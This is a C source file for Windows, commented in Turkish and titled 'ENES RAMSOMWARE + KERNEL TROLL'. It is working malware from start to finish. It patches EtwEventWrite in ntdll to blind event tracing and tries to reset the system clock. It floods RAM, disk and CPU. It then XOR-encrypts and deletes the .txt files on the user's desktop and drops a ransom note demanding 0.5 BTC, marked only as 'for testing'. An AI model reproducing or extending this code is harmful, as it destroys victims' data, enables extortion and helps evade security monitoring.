#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>  // Burada enum ve struct zaten var
#include <stdio.h>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib")

#define XOR_KEY 0xAA

typedef NTSTATUS(WINAPI* pZwSetSystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG
);

// ----------------------------
// KERNEL TROLL: Sistem zamanını çarpıt
// ----------------------------
void TrollSystemTime() {
    pZwSetSystemInformation ZwSetInfo = (pZwSetSystemInformation)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetSystemInformation");

    if (!ZwSetInfo) {
        printf("❌ ZwSetSystemInformation bulunamadı!\n");
        return;
    }

    SYSTEM_TIMEOFDAY_INFORMATION spoofedTime = { 0 };
    spoofedTime.BootTime.QuadPart = 0;
    spoofedTime.CurrentTime.QuadPart = 1; // Epoch time!
    spoofedTime.TimeZoneBias.QuadPart = 0;
    spoofedTime.CurrentTimeZoneId = 0;

    NTSTATUS result = ZwSetInfo(SystemTimeOfDayInformation, &spoofedTime, sizeof(spoofedTime));
    if (result == 0) {
        printf("✅ Kernel troll: sistem zamanı çarpıtıldı!\n");
    }
    else {
        printf("❌ Kernel troll başarısız. NTSTATUS: 0x%X\n", result);
    }
}

// ----------------------------
// KERNEL TROLL: ETW Patch
// ----------------------------
void PatchETW() {
    void* addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (!addr) {
        printf("❌ EtwEventWrite bulunamadı!\n");
        return;
    }

    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)addr = 0xC3; // ret opcode
    VirtualProtect(addr, 1, oldProtect, &oldProtect);

    printf("✅ Kernel troll: EtwEventWrite patch'lendi!\n");
}

// ----------------------------
// RAM Doldurma
// ----------------------------
void RamFill() {
    const SIZE_T blockSize = 50 * 1024 * 1024; // 50 MB
    SIZE_T total = 0;

    while (total < 1024ULL * 1024 * 1024) { // 1 GB'e kadar doldur
        void* mem = malloc(blockSize);
        if (mem == NULL) {
            printf("💥 Bellek bitti! Toplam: %.2f MB\n", total / (1024.0 * 1024.0));
            return;
        }
        memset(mem, 0x41, blockSize);
        total += blockSize;
        printf("RAM tahsis edildi: %.2f MB\n", total / (1024.0 * 1024.0));
        Sleep(100);
    }
}

// ----------------------------
// Disk Doldurma
// ----------------------------
void DiskFill() {
    FILE* f = fopen("C:\\temp\\bigfile.bin", "wb");
    if (!f) {
        printf("Disk doldurma için dosya açılamadı!\n");
        return;
    }

    const size_t WRITE_SIZE = 1024 * 1024;
    char buffer[WRITE_SIZE];
    memset(buffer, 0x41, WRITE_SIZE);

    size_t total_size = 0;

    fseek(f, 0, SEEK_END);
    while (total_size < 1024ULL * 1024 * 1024) { // 1 GB doldur
        fwrite(buffer, 1, WRITE_SIZE, f);
        total_size += WRITE_SIZE;
    }

    fclose(f);
    printf("✅ Disk doldurma tamamlandı!\n");
}

// ----------------------------
// CPU Döngüsü Thread
// ----------------------------
DWORD WINAPI MyThread(LPVOID lpParam) {
    while (1) {
        for (int i = 0; i < 1000000; i++) {}
        Sleep(1);
    }
    return 0;
}

void CreateCpuThreads() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD cpuCount = sysInfo.dwNumberOfProcessors;

    for (DWORD i = 0; i < cpuCount; i++) {
        CreateThread(NULL, 0, MyThread, NULL, 0, NULL);
    }
    printf("✅ CPU troll: %lu thread oluşturuldu.\n", cpuCount);
}

// ----------------------------
// RANSOMWARE: XOR Şifreleme
// ----------------------------
void xorEncrypt(const char* filePath) {
    FILE* f = fopen(filePath, "rb");
    if (!f) {
        printf("❌ Dosya açılamadı: %s\n", filePath);
        return;
    }

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    BYTE* buffer = (BYTE*)malloc(size);
    fread(buffer, 1, size, f);
    fclose(f);

    for (long i = 0; i < size; i++) {
        buffer[i] ^= XOR_KEY;
    }

    char encryptedPath[MAX_PATH];
    snprintf(encryptedPath, MAX_PATH, "%s.locked", filePath);
    FILE* out = fopen(encryptedPath, "wb");
    fwrite(buffer, 1, size, out);
    fclose(out);

    DeleteFileA(filePath);

    printf("✅ Şifrelendi: %s\n", encryptedPath);
    free(buffer);
}

void EncryptDesktopTxtFiles() {
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*.txt", desktopPath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Masaüstünde txt dosyası yok.\n");
        return;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char filePath[MAX_PATH];
            snprintf(filePath, MAX_PATH, "%s\\%s", desktopPath, fd.cFileName);
            xorEncrypt(filePath);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);

    // Fidye notu bırak
    char ransomNotePath[MAX_PATH];
    snprintf(ransomNotePath, MAX_PATH, "%s\\README_LOCKED.txt", desktopPath);

    FILE* note = fopen(ransomNotePath, "w");
    fprintf(note,
        "ENES WAS HERE!\n"
        "Dosyaların XOR ile şifrelendi.\n"
        "Kurtarmak istiyorsan 0.5 BTC gönder. (TEST AMAÇLI)\n");
    fclose(note);

    printf("✅ Fidye notu bırakıldı: %s\n", ransomNotePath);
}

// ----------------------------
// MAIN
// ----------------------------
int main() {
    printf("\n==== ENES RAMSOMWARE + KERNEL TROLL ====\n");

    TrollSystemTime();
    PatchETW();
    RamFill();
    DiskFill();
    CreateCpuThreads();
    EncryptDesktopTxtFiles();

    printf("\n✅ Tüm işlemler tamam!\n");
    return 0;
}

